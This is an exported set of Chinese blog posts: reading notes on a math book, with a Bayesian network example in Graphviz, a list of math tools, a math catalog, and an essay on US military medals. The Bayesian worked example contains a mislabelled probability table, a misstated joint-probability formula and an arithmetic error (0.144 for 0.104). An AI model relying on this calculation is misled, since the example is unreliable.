<h4 id="第十章-PageRank——Google的民主表决式网页排名技术"><a href="#第十章-PageRank——Google的民主表决式网页排名技术" class="headerlink" title="第十章 PageRank——Google的民主表决式网页排名技术"></a>第十章 PageRank——Google的民主表决式网页排名技术</h4><h4 id="第十一章-如何确定网页和查询的相关性"><a href="#第十一章-如何确定网页和查询的相关性" class="headerlink" title="第十一章 如何确定网页和查询的相关性"></a>第十一章 如何确定网页和查询的相关性</h4><h4 id="第十二章-地图和本地搜索的最基本技术——有限状态机和动态规划"><a href="#第十二章-地图和本地搜索的最基本技术——有限状态机和动态规划" class="headerlink" title="第十二章 地图和本地搜索的最基本技术——有限状态机和动态规划"></a>第十二章 地图和本地搜索的最基本技术——有限状态机和动态规划</h4><h4 id="第十三章-Google-AK-47的设计者——阿米特-辛格博士"><a href="#第十三章-Google-AK-47的设计者——阿米特-辛格博士" class="headerlink" title="第十三章 Google AK-47的设计者——阿米特-辛格博士"></a>第十三章 Google AK-47的设计者——阿米特-辛格博士</h4><h4 id="第十四章-余弦定理和新闻的分类"><a href="#第十四章-余弦定理和新闻的分类" class="headerlink" title="第十四章 余弦定理和新闻的分类"></a>第十四章 余弦定理和新闻的分类</h4><h4 id="第十五章-矩阵运算和文本处理中的两个分类问题"><a href="#第十五章-矩阵运算和文本处理中的两个分类问题" class="headerlink" title="第十五章 矩阵运算和文本处理中的两个分类问题"></a>第十五章 矩阵运算和文本处理中的两个分类问题</h4><h4 id="第十六章-信息指纹及其应用"><a href="#第十六章-信息指纹及其应用" class="headerlink" title="第十六章 信息指纹及其应用"></a>第十六章 信息指纹及其应用</h4><h4 id="第十七章-由电视剧《暗算》所想到的——谈谈密码学的数据原理"><a href="#第十七章-由电视剧《暗算》所想到的——谈谈密码学的数据原理" class="headerlink" title="第十七章 由电视剧《暗算》所想到的——谈谈密码学的数据原理"></a>第十七章 由电视剧《暗算》所想到的——谈谈密码学的数据原理</h4><p>计划：201706</p>
<h4 id="第十八章-闪光的不一定是金子——谈谈搜索引擎反作弊问题"><a href="#第十八章-闪光的不一定是金子——谈谈搜索引擎反作弊问题" class="headerlink" title="第十八章 闪光的不一定是金子——谈谈搜索引擎反作弊问题"></a>第十八章 闪光的不一定是金子——谈谈搜索引擎反作弊问题</h4><h4 id="第十九章-谈谈数学模型的重要性"><a href="#第十九章-谈谈数学模型的重要性" class="headerlink" title="第十九章 谈谈数学模型的重要性"></a>第十九章 谈谈数学模型的重要性</h4><h4 id="第二十章-不要把鸡蛋放在一个篮子里——谈谈最大熵模型"><a href="#第二十章-不要把鸡蛋放在一个篮子里——谈谈最大熵模型" class="headerlink" title="第二十章 不要把鸡蛋放在一个篮子里——谈谈最大熵模型"></a>第二十章 不要把鸡蛋放在一个篮子里——谈谈最大熵模型</h4><h4 id="第二十一章-拼音输入法的数学模型"><a href="#第二十一章-拼音输入法的数学模型" class="headerlink" title="第二十一章 拼音输入法的数学模型"></a>第二十一章 拼音输入法的数学模型</h4><h4 id="第二十二章-自然语言处理的教父马库斯和他的优秀弟子们"><a href="#第二十二章-自然语言处理的教父马库斯和他的优秀弟子们" class="headerlink" title="第二十二章 自然语言处理的教父马库斯和他的优秀弟子们"></a>第二十二章 自然语言处理的教父马库斯和他的优秀弟子们</h4><h4 id="第二十三章-布隆过滤器"><a href="#第二十三章-布隆过滤器" class="headerlink" title="第二十三章 布隆过滤器"></a>第二十三章 布隆过滤器</h4><h2 id="第二十四章-马尔可夫链的扩展——贝叶斯网络"><a href="#第二十四章-马尔可夫链的扩展——贝叶斯网络" class="headerlink" title="第二十四章 马尔可夫链的扩展——贝叶斯网络"></a>第二十四章 马尔可夫链的扩展——贝叶斯网络</h2><p>计划：201706<br>通读：20170925</p>
<p><strong>贝叶斯网络（Bayesian network）</strong> 是一种概率图型模型。</p>
<p>一般而言，贝叶斯网络中的节点表示随机变量，连接两个节点的箭头代表此两个随机变量是具有因果关系的；而两个节点间若没有箭头相互连接一起，表明他们之间没有直接的因果关系（注：并不表明A不会通过其他状态间接地影响状态B）。所有这些（因果）关系，都可以有一个量化的可信度（Belief）,用一个概率描述。也就是说，贝叶斯网络的弧上可以有附加的权重。因此，贝叶斯网络也被称作 <strong>信念网络（Belief Networks）</strong> 或者 <strong>有向无环图模型（directed acyclic graphical model）</strong> 。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Bayesian-network.png" alt=""></p>
<h4 id="案例：描述心血管疾病和成因"><a href="#案例：描述心血管疾病和成因" class="headerlink" title="案例：描述心血管疾病和成因"></a>案例：描述心血管疾病和成因</h4><p>一个简单的贝叶斯网络案例，描述心血管疾病和成因。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">digraph diseaseCVD&#123;</span><br><span class="line">  label=&quot;\n 案例：一个描述心血管疾病和成因的贝叶斯网络 \n&quot;;</span><br><span class="line">  心血管疾病-&gt;胆固醇量;</span><br><span class="line">  心血管疾病-&gt;血脂;</span><br><span class="line">  心血管疾病-&gt;吸烟;</span><br><span class="line">  心血管疾病-&gt;运动量;</span><br><span class="line">  心血管疾病-&gt;家族病史;</span><br><span class="line">  胆固醇量-&gt;运动量;</span><br><span class="line">  胆固醇量-&gt;饱和脂肪摄取量;</span><br><span class="line">  胆固醇量-&gt;家族病史;</span><br><span class="line">  血脂-&gt;饱和脂肪摄取量;</span><br><span class="line">  血脂-&gt;家族病史;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="http://riboseyim-qiniu.riboseyim.com/disease_CVD.png" alt=""></p>
<p>上面的例子进一步简化之后，假定只有三个状态 “心血管疾病”，“高血脂”和“家族病史”。假定每个状态只有“有”、“无”两种，并且给出组合状态的条件概率。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">digraph SimpleDiseaseCVD&#123;</span><br><span class="line">  label=&quot;\n 案例：心血管疾病和成因的贝叶斯网络（简化） \n&quot;;</span><br><span class="line">  心血管疾病-&gt;高血脂;</span><br><span class="line">  心血管疾病-&gt;家族病史;</span><br><span class="line">  高血脂-&gt;家族病史;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<div class="table-container">
<table>
<thead>
<tr>
<th>心血管疾病</th>
<th>家族病史、高血脂</th>
<th>有</th>
<th>无</th>
</tr>
</thead>
<tbody>
<tr>
<td>有</td>
<td>有</td>
<td>0.9</td>
<td>0.1</td>
</tr>
<tr>
<td>有</td>
<td>无</td>
<td>0.4</td>
<td>0.6</td>
</tr>
<tr>
<td>有</td>
<td>有</td>
<td>0.4</td>
<td>0.6</td>
</tr>
<tr>
<td>有</td>
<td>无</td>
<td>0.1</td>
<td>0.9</td>
</tr>
</tbody>
</table>
</div>
<div class="table-container">
<table>
<thead>
<tr>
<th>高血脂</th>
<th>家族病史</th>
<th>有</th>
<th>无</th>
</tr>
</thead>
<tbody>
<tr>
<td>有</td>
<td>有</td>
<td>0.4</td>
<td>0.6</td>
</tr>
<tr>
<td>有</td>
<td>无</td>
<td>0.1</td>
<td>0.9</td>
</tr>
</tbody>
</table>
</div>
<p>联合概率分布（贝叶斯公式）：</p>
<blockquote>
<p>P(家族病史，高血脂，心血管疾病) = P（家族病史|高血脂，心血管疾病）x P（高血脂|家族病史）x P（家族病史）</p>
</blockquote>
<p>例如，计算心血管疾病有多大概率是由家族病史引起的。</p>
<blockquote>
<p>P(家族病史|有心脏病) = P（有家族病史，有心脏病）/ P（有心脏病）</p>
</blockquote>
<p>其中：</p>
<blockquote>
<p>P(有家族病史，有心脏病) = P（有家族病史，有心脏病，无高血脂）+ P（有家族病史，有心脏病，有高血脂）</p>
<p>P(有心脏病) = P（有家族病史，有心脏病，无高血脂）+ P（有家族病史，有心脏病，有高血脂）+ P（无家族病史，有心脏病，无高血脂）+ P（无家族病史，有心脏病，有高血脂）</p>
</blockquote>
<p>P(有家族病史，有心脏病) = 0.18 x 0.4 + 0.12 x 0.4<br>                    = 0.12</p>
<p>P(有心脏病) = 0.12 + 0.08x0.4 + 0.72x0.1<br>          = 0.12 + 0.144<br>          = 0.264</p>
<h4 id="第二十五章-条件随即场和句法分析"><a href="#第二十五章-条件随即场和句法分析" class="headerlink" title="第二十五章 条件随即场和句法分析"></a>第二十五章 条件随即场和句法分析</h4><h4 id="第二十六章-维特比和他的维特比算法"><a href="#第二十六章-维特比和他的维特比算法" class="headerlink" title="第二十六章 维特比和他的维特比算法"></a>第二十六章 维特比和他的维特比算法</h4><h4 id="第二十七章-再谈文本自动分类问题——期望最大化算法"><a href="#第二十七章-再谈文本自动分类问题——期望最大化算法" class="headerlink" title="第二十七章 再谈文本自动分类问题——期望最大化算法"></a>第二十七章 再谈文本自动分类问题——期望最大化算法</h4><h4 id="第二十八章-逻辑回归和搜索广告"><a href="#第二十八章-逻辑回归和搜索广告" class="headerlink" title="第二十八章 逻辑回归和搜索广告"></a>第二十八章 逻辑回归和搜索广告</h4><h4 id="第二十九章-各个击破算法和Google云计算的基础"><a href="#第二十九章-各个击破算法和Google云计算的基础" class="headerlink" title="第二十九章 各个击破算法和Google云计算的基础"></a>第二十九章 各个击破算法和Google云计算的基础</h4><h4 id="第三十章-逻辑回归和搜索广告"><a href="#第三十章-逻辑回归和搜索广告" class="headerlink" title="第三十章 逻辑回归和搜索广告"></a>第三十章 逻辑回归和搜索广告</h4><h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://riboseyim.github.io/2017/09/15/Visualization-Graphviz/">数据可视化（三）基于 Graphviz 实现程序化绘图 | 开源中国首页推荐·每日一博</a></li>
<li>Why draw when you can code?</li>
<li>Graphviz 简介</li>
<li>最佳 Graphviz 实践：流程图、数据结构图、网络路径 Trace Route、复杂社会关系链分析、机器学习算法-决策树(Decision Tree)</li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://blog.insightdatascience.com/how-to-solve-90-of-nlp-problems-a-step-by-step-guide-fda605278e4e">How to solve 90% of NLP problems: a step-by-step guide | Using Machine Learning to understand and leverage text</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>数学与算法</tag>
        <tag>科技史</tag>
      </tags>
  </entry>
  <entry>
    <title>数学工具指南</title>
    <url>/2018/02/02/Mathmetics-Tools/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>公式排版（LaTeX）</li>
<li>公式图形化（GeoGebra）</li>
<li>数据结构可视化<span id="more"></span>
</li>
</ul>
<h2 id="公式排版（LaTeX）"><a href="#公式排版（LaTeX）" class="headerlink" title="公式排版（LaTeX）"></a>公式排版（LaTeX）</h2><ul>
<li><a href="https://zh.wikipedia.org/wiki/LaTeX">LaTeX</a></li>
<li><a href="https://atom.io/packages/markdown-preview-enhanced">Atom plugin : markdown-preview-enhanced</a></li>
<li><a href="https://abcdabcd987.com/macos-vector-graphics-tips/">macOS 矢量作图小贴士</a></li>
<li><a href="https://linuxtoy.org/archives/selfhosted-server.html">Mathpix：将图像转换为 LaTeX</a></li>
</ul>
<p><img src="https://i.github-camo.com/61bd94ce1a8210eee2b9c3fd502a5b695209d282/68747470733a2f2f757365722d696d616765732e67697468756275736572636f6e74656e742e636f6d2f313930383836332f32383232373935332d65623665656661342d363861312d313165372d383736392d3936656138336661636633622e706e67" alt=""></p>
<h2 id="公式图形化"><a href="#公式图形化" class="headerlink" title="公式图形化"></a>公式图形化</h2><ul>
<li><a href="https://www.geogebra.org/materials/">Geogebra</a></li>
<li><a href="http://blog.csdn.net/dog250/article/details/77148217">Bomb250@从gnuplot到GeoGebra的艰难之旅</a></li>
</ul>
<h2 id="数据结构可视化"><a href="#数据结构可视化" class="headerlink" title="数据结构可视化"></a>数据结构可视化</h2><ul>
<li><a href="https://riboseyim.com/2017/09/15/Visualization-Graphviz/">数据可视化（三）基于 Graphviz 实现程序化绘图</a></li>
<li><a href="https://riboseyim.com/2018/12/16/Visualization-SocialNetwork/">数据可视化（八）Program,Data and Classical Music</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/R-Go-Music-1.png" alt=""></p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://inf.ethz.ch/personal/markusp/teaching/guides/guide-tables.pdf">制作优雅数据表格 | Small Guide to Making Nice Tables</a></li>
<li>分数线分割的式子字体缩小问题&amp;积分号太短的问题:<a href="http://blog.csdn.net/dog250/article/details/79112630">将表达式中的\frac换成\dfrac即可，这里的d的意思是displaystyle</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>数学与算法</tag>
      </tags>
  </entry>
  <entry>
    <title>Catalog:数学</title>
    <url>/2017/06/14/Mathmetics/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><blockquote>
<p>不懂数学就是一个很大的障碍。—— 理查德·费曼</p>
</blockquote>
<span id="more"></span>
<h2 id="统计建模"><a href="#统计建模" class="headerlink" title="统计建模"></a>统计建模</h2><h4 id="统计"><a href="#统计" class="headerlink" title="统计"></a>统计</h4><h4 id="概率"><a href="#概率" class="headerlink" title="概率"></a>概率</h4><h2 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h2><ul>
<li><a href="https://riboseyim.com/2018/02/10/Machine-Learning-Algorithms/">Machine Learning:机器学习算法</a></li>
<li><a href="https://riboseyim.com/2018/04/02/Machine-Learning-Algorithms-Sheet/">Machine Learning:如何选择机器学习算法</a></li>
<li><a href="https://riboseyim.com/2018/05/07/Machine-Learning-Neural-Network">Machine Learning:神经网络基础</a></li>
</ul>
<blockquote>
<p>我花了几年时间研究数学工具，希望它能帮助我解决理论问题，可惜没有成功。然后我发现，要做到这一点，首先我必须弄清楚答案可能是什么样的。这很难解释明白，总之，在我得到一个好的定量工具之前，我首先要有个定性的观念。—— 理查德·费曼</p>
</blockquote>
<h2 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h2><h4 id="R-语言"><a href="#R-语言" class="headerlink" title="R 语言"></a>R 语言</h4><h2 id="Cheatsheet"><a href="#Cheatsheet" class="headerlink" title="Cheatsheet"></a>Cheatsheet</h2><ul>
<li><a href="http://web.mit.edu/~csvoss/Public/usabo/stats_handout.pdf">统计</a></li>
<li><a href="http://www.wzchen.com/s/probability_cheatsheet.pdf">概率</a></li>
<li><a href="https://minireference.com/static/tutorials/linear_algebra_in_4_pages.pdf">线性代数</a></li>
<li><a href="http://tutorial.math.lamar.edu/getfile.aspx?file=B,41,N">微积分</a></li>
<li><a href="https://github.com/afshinea/stanford-cs-229-machine-learning">Stanford’s CS 229 Machine Learning</a></li>
</ul>
<h2 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h2><ul>
<li><a href="https://riboseyim.com/2017/09/15/Visualization-Graphviz/">数据可视化（三）基于 Graphviz 实现程序化绘图</a></li>
<li><a href="https://riboseyim.com/2018/12/16/Visualization-SocialNetwork/">数据可视化（八）Program,Data and Classical Music</a></li>
<li><a href="https://riboseyim.com/2017/08/30/Mathmetics-Beauty/">读书笔记|数学之美（Beauty Of Mathmetics）</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://pimbook.org/pdf/pim_first_pages.pdf">A Programmer’s Introduction to Mathematics | Jeremy Kun</a></li>
<li><a href="https://mathwithbaddrawings.com/2016/07/13/why-not-to-trust-statistics/">Why Not to Trust Statistics</a></li>
<li><a href="http://www.infoq.com/cn/news/2016/07/OliverSchabenberger-AnalyticSer">统计建模与机器学习的区别 |作者 Oliver Schabenberger | 译者 NER 发布于 2016年7月20日</a></li>
<li><a href="https://mp.weixin.qq.com/s/fUIbFZNjGC3uKqV4LJBQ7w?scene=25#wechat_redirect">程序员学数学读哪些书？| 图灵教育</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>数学与算法</tag>
      </tags>
  </entry>
  <entry>
    <title>外军研究|美军授勋及嘉奖制度观察</title>
    <url>/2017/04/09/Medal/</url>
    <content><![CDATA[<blockquote>
<p>孟子曰：君子所以异于人者，以其存心也。君子以仁存心，以礼存心。仁者爱人，有礼者敬人。爱人者人恒爱之，敬人者人恒敬之。</p>
</blockquote>
<p>呼唤英雄、崇敬英雄是世界各民族的普遍情怀。可以说自人类文明诞生以来，人们就通过各种方式来表达自己的崇敬之心，而且无论哪个时代、何种政权组织形式，都将荣誉系统牢牢控制在掌权者自己手中，作为自己道统、法统的重要组成部分。延之今日，世界各国已经发展出纷繁复杂的授勋和嘉奖制度，用以宣誓盟友、奖赏立有功勋或特殊贡献的人群，我们可以很容易找到两个说同样语言的国家，但是绝没有两个勋奖制度完全一致的国家或地区。作为承续欧洲盎格鲁-撒克逊民族尚武传统、当今世界唯一的罗马帝国——美国，其军事勋奖制度非常丰富，而且传承有序、体系完备，很值得参考研究。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-Medal-Sample-Top-theme.png" alt></p>
<a id="more"></a>
<p>在目前世界各国中，授与勋章的组织为政府，而受勋者多为文职和军职人员，但受勋者的身份依各国的奖励制度法令而有所差异。严格来说，勋章的样式和受勋者都以军职人员为多。所以，本文暂时只讨论美国军职人员勋奖制度体系。</p>
<blockquote>
<p>我们这些年轻军官多么羡慕资深的少校在阿布科里战役中冒险的经历啊！我们又是多么羡慕上校获得的一长排荣誉勋章啊！他们不止一次给我们讲述他们以前激动人心的经历，我们百听不厌。我们多么希望也能有类似的记忆匣子，如果需要的话，可以向一群意气相投的观众一遍一遍地打开陈列。（温斯顿·S·丘吉尔《丘吉尔传·我的青春》p81）</p>
</blockquote>
<h2 id="勋章的配件要素"><a href="#勋章的配件要素" class="headerlink" title="勋章的配件要素"></a>勋章的配件要素</h2><p>勋章的配件根据各国的不同情况会有所不同，实际上并不是所有的国家都具有以下的勋章配件，名称和佩戴礼节也会有所不同。主要包括如下几部分：<br>颈饰（Collar）：环绕颈项佩戴的贵金属项链，在肩部以护肩固定（大项链级）或藏于衣领之下（颈链级），只在君主主持的仪式以及一部分共和制国家（如法国、俄罗斯等）国家元首就职时佩戴。<br>徽章（Collar badge）：颈饰上的徽章，在不佩戴颈饰时，替代颈饰佩戴在绶带尾端。<br>勋章（Order）：佩戴于左或右襟下侧位置，女士或配偶佩戴的勋章在设计上不同于男士配戴的勋章，它们通常附有一个蝴蝶结丝带。<br>勋扣（Medal clasp）：亦称饰版，军事勋章的附属配件，佩戴于丝带上的金属夹或衣领上的金属扣。<br>襟绶（Medal ribbon）：悬挂奖章的丝带。<br>略绶（Ribbon bar）：勋略，勋表，是在无法佩戴星章或奖章时替代使用的长方形略章，也有扣针型的圆形略章。<br>花结（Rosette）：特种襟绶，带有花结的襟绶，等次较无花结的襟绶要高。<br>奖状（Certificate）：勋章的证明书。</p>
<p>为了突出关键内容，本文一般只讨论勋章和勋表。</p>
<h2 id="勋章等级体系"><a href="#勋章等级体系" class="headerlink" title="勋章等级体系"></a>勋章等级体系</h2><p>勋章作为国家之名器，体现着国家对于人的价值和贡献的认同，因此也具有严格的等级区别。目前世界各国的勋奖体系因历史条件等各方面因素，等级划分多有不同，勋章式样也不尽统一，美国的军事荣誉勋章体系大致如下：</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-Medal-System-20170409.png" alt></p>
<p>从勋章等级上划分，高级别的勋章主要有以下几类：</p>
<p>当然了这里的级别高低仅是从获取难度系数来考量，法律并没有规定这些勋章的等级，这些划分只是为了便于理解。各军种的勋章都各有特色，除了少数几种之外、也没有明确的横向对比关系。</p>
<h4 id="第一，荣誉勋章（Medal-of-Honor）"><a href="#第一，荣誉勋章（Medal-of-Honor）" class="headerlink" title="第一，荣誉勋章（Medal of Honor）"></a>第一，荣誉勋章（Medal of Honor）</h4><p>由美国政府颁发的美国最高军事荣衔，授予那些“在战斗中冒生命危险，在义务之外表现出英勇无畏”的军人。它的历史可追溯至1862年美国内战期间，迄今已颁发了近3460次。海、陆、空三军的成员皆有资格获颁这份荣誉，而每个军种授予的荣誉勋章各有其独特的设计。它由兼任三军总总司令的美国总统代表全国人民亲自颁发。在荣誉勋章的授予证书上有“以国会的名义”（in the name of Congress），它常常被误称为“国会荣誉勋章”。</p>
<p>荣誉勋章是美国唯一不能合法买卖的奖章。非获得人在公共场合穿戴它也是违法的。违法者根据美国法典第18章33节704条的规定会被判罚款及监禁不超过1年。<br>获得荣誉勋章不意味着获勋者可以享有特殊的个人特权，也不意味免除其应该履行的军人义务，但是仍然拥有一定福利待遇。比如在有空余舱位的情况下，获得荣誉勋章的个人可以免费乘坐军事空运司令部的飞机；获得荣誉勋章的个人的子女只要符合规定条件，可以不受名额限制由美国军事学院录取等。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-Medal-Sample-Top-1.png" alt></p>
<h4 id="第二，十字勋章（Navy-Cross／Flying-Cross／Air-Force-Cross／Distinguished-Service-Cross）"><a href="#第二，十字勋章（Navy-Cross／Flying-Cross／Air-Force-Cross／Distinguished-Service-Cross）" class="headerlink" title="第二，十字勋章（Navy Cross／Flying Cross／Air Force Cross／Distinguished Service Cross）"></a>第二，十字勋章（Navy Cross／Flying Cross／Air Force Cross／Distinguished Service Cross）</h4><p>授予条件是“在与敌对武装力量的战斗中冒生命危险并且超越了职责范畴，展现出的超凡的英勇行为”。初创时，海军十字勋章是低于海军杰出服役勋章，因为那时它可以因战斗英勇行为和“其它的杰出服役行为”而颁发。美国国会在1942年8月7日做出了调整，令海军十字勋章只可因战斗行为而授予，并将其等级置于海军杰出服役勋章之上，仅次于荣誉勋章。</p>
<blockquote>
<p>总统可将空军十字勋章授予那些在下列行动中表现出了特别的勇敢，但不足以授予荣誉勋章的美国空军的成员：</p>
<ol>
<li>面对美国敌人时的行为</li>
<li>与敌对外国势力的军事行动</li>
<li>在友军中服役时，参与了友军与敌对势力（美国为非参战国）的武装冲突<br>— 《美国法典》第十部，第8742条：空军十字勋章：授予</li>
</ol>
</blockquote>
<h4 id="第三，杰出服役勋章-（Distinguished-Service-Medal）"><a href="#第三，杰出服役勋章-（Distinguished-Service-Medal）" class="headerlink" title="第三，杰出服役勋章 （Distinguished Service Medal）"></a>第三，杰出服役勋章 （Distinguished Service Medal）</h4><p>国防部杰出服役勋章（Defense Distinguished Service Medal）是一项美军跨军种通用勋奖，由时任美国总统的理查德·尼克松于1970年7月9日设立，用于表彰在美国国家安全和国防领域杰出的表现。它只颁发给那些在联合作战行动中最高层级的指挥军官。它也可以授予那些在国家安全或国防方面做出了突出个人贡献的高级军官。它是美国和平时期最高等级的防务嘉奖。通常情况下，能够获得国防部杰出服役勋章的都是美军最为资深的军官，如参谋长联席会议的主席或副主席，各军种的参谋长和副参谋长，以及那些直接受命于美国国防部的联合司令部的指挥官，以及其它高级官员。</p>
<p>这类勋章也是美国军事勋章体系中，极少数只颁发给高级军官的勋章。其他三军的杰出服役勋章，通常要求必须是少将以上军衔。</p>
<h4 id="第四，其他勋章"><a href="#第四，其他勋章" class="headerlink" title="第四，其他勋章"></a>第四，其他勋章</h4><p>这类勋章数量最多，大致可以分为以下几种：<br>立功：除了荣誉勋章、十字勋章以外的各类功勋奖章、嘉奖奖章，一般授予个人。<br>参战纪念：阳光普照奖，包括各类海外部署，参加实战行动甚至人道主义救援即可获得。例如伊拉克参战奖章在2005年6月曾被分发给曾在伊拉克边境或周边水域作战，执行任务达30个连续日或60个不连续日的美军士兵。其中参加战斗者、在战斗中负伤者或在恐怖袭击中负伤者不受上述时间限制。<br>长期服役：通常是服役10年以上资深官兵，达到年限一般都可以授予<br>道德品质：这个最有意思，大概是遵纪守法的意思，没有打群架、砸酒吧、没事学雷锋做好事都可以得。陆军／海军／海军陆战队的优良品德奖章，授予个人，空军好像没有。<br>特殊技能：步枪射手、优秀步枪射手、教官经历、士官也有自己专门的勋表。有些人即使升到将军，都会年轻的时候因为没有拿到优秀射手的勋表而遗憾。<br>集体嘉奖：美帝是非常注重集体荣誉的，如果所在单位获得了总统／军种的集体嘉奖，所有成员都可以终身佩戴特殊勋表的。</p>
<blockquote>
<p>我在1993年10月上舰时，还是连一枚勋章也没有的年轻水手，但今天，我已经披上了“战斗效能E”奖绶带、<br>参加前沿部署而获得“海上服役勋章”、参加“灵活勇士行动”而获得“西南亚防务勋章”，参加波斯尼亚作战而获得的北约勋章……作为“大西洋舰队最佳舰”而获得“巴腾伯格杯”；作为我们驱逐舰中的第一舰而获得“战斗效能E”奖；作为全海军伙食保障的最佳舰艇而获得“弗兰西斯-F-内伊上校”奖；因优秀的通信保障而获得“汤普森上将杯”；以及因续航力、士气和指挥氛围表现优异而获得“金锚”奖。<br>——-《驱逐舰舰长》【美】詹姆斯-斯塔夫里迪斯</p>
</blockquote>
<h2 id="案例：看图读勋表"><a href="#案例：看图读勋表" class="headerlink" title="案例：看图读勋表"></a>案例：看图读勋表</h2><p>为了更好地理解这些勋章的意义，让我们来看一些案例：</p>
<p>电影<a href="https://en.wikipedia.org/wiki/Men_of_Honor" target="_blank" rel="noopener">《深海潜将》</a>中军士长 —— 雷斯里·威廉·桑戴（Leslie Sunday），之所以屡屡抗命、甚至殴打长官都只是被降职而不会被开除军籍，除了资深的专业水平，就是因为他在二战中的英勇表现获得了海军最高荣誉——海军十字勋章。这枚勋章的含金量足以让他俯视整个美国海军，只要他愿意，就可以一辈子干下去。（当然，以上都是我揣测的）</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-Medal-FilmDiver-Notes-1.png" alt></p>
<p><strong>中级军官（上校）的典型勋表</strong></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-Medal-FilmDiver-Hanke.png" alt></p>
<p><strong>海豹突击队 VS 普通水兵</strong></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-Medal-Navy-Seg-Notes-1.png" alt></p>
<p><strong>高级军官（空军四星上将）</strong></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-Medal-Airforce-Gen-1.png" alt><br>通过美国军人胸前的勋表，几乎可以还原他的个人履历。这是美国空军一位在职的四星上将从他的勋表上分析，应该没有太多一线实战经历，毕竟天下承平日久，这类级别的军官很难有一展英勇的机会。但是我注意到，他居然还有特等射手勋表，枪法应该很好，是不是很吊的样子。</p>
<p>实际佩戴的勋表中，还有一些比较精致的 <strong>勋表附属物</strong> ：</p>
<p>1.橡树叶枝<br>铜橡树叶枝表示第二次获得同一勋章，银橡树叶枝代表五个铜橡树叶枝。<br>2.星星<br>铜星或金星表示第二次获得同一勋章(在一些只颁发一枚的战役奖章上表示参加过一次符合奖章颁发条件的战斗)，银星代表五个铜星或金星。<br>3.字母”V”(Combat Distinguishing Device)<br>“V”代表Valor(英勇)，只有在嘉奖令中授权的人员可以使用。前海军作战部长(Chief of Naval Operations)Jeremy Michael Boorda将军就因为曾使用据认为是未授权的”V”标志而于1996年5月16日自杀身亡。</p>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>据《华盛顿时报》（The Washington Times）2018 年 8 月 15 日消息，国防部净评估办公室詹前雇员亚当·勒夫哲（Adam Lovinger）指控净评估办公室掌门人詹姆斯·贝克（James Baker）采取了几种手段针对他，其中之一是推荐两名军官获得极有声望的军队奖章，以此作为激励，将勒夫哲作为一项泄密调查的对象。</p>
<ul>
<li><a href="https://mp.weixin.qq.com/s/-GE1FRNnWJ_0cDkNsy5z_g" target="_blank" rel="noopener">净而不“净”：净评估办公室卷入美国政治风波</a></li>
</ul>
<h2 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h2><p>第一，美国的军事勋章体系是历史积累的产物，并不是某一人哪一朝设计好的，他们也很注意历史的延续性，对于传统项目尽量都予以保留。<br>第二，勋章体系背后有一套完善的法律框架。创造新的勋章类别，都是以国会法案为核心，总统令和军种条例为基石。对于那些不合时宜需要取消，或者需要调整的勋章等级的情况，往往通过国会修法的形式予以确认。<br>第三，授勋的条件设置体现官兵一致、倾向基层、倾向战斗一线的精神。例如，除了杰出服役勋章等个别情况，绝大部分勋章的授予门槛向中下层官兵开放，甚至像十字勋章这类高等级勋章，几乎只有可能是由作战一线人员获得。所以有的时候单看勋表，都不太能够判断该军人的军衔级别。那些具备丰富实战经验的士官，所获勋章常常比一般的中高级军官还要多。</p>
<h2 id="扩展阅读：《讲武堂》"><a href="#扩展阅读：《讲武堂》" class="headerlink" title="扩展阅读：《讲武堂》"></a>扩展阅读：《讲武堂》</h2><ul>
<li><a href="https://riboseyim.github.io/2017/08/15/Commander-Sergeant/" target="_blank" rel="noopener">美军士官制度观察</a></li>
<li><a href="http://www.jianshu.com/p/c92c042b1b34" target="_blank" rel="noopener">美军体能训练观察</a></li>
<li><a href="http://www.jianshu.com/p/4c3731d6b552" target="_blank" rel="noopener">各国军队体能标准横向评测</a></li>
<li><a href="https://riboseyim.github.io/2017/04/09/Medal/" target="_blank" rel="noopener">美军授勋和嘉奖制度观察</a></li>
<li><a href="https://riboseyim.github.io/2017/07/14/Medal-HK/" target="_blank" rel="noopener">太公分猪肉——香港特区授勋和嘉奖制度批判</a></li>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-Art-Of-War-Chinese/" target="_blank" rel="noopener">中国传统兵法摘要</a></li>
</ul>
<h2 id="军事条例"><a href="#军事条例" class="headerlink" title="军事条例"></a>军事条例</h2><ul>
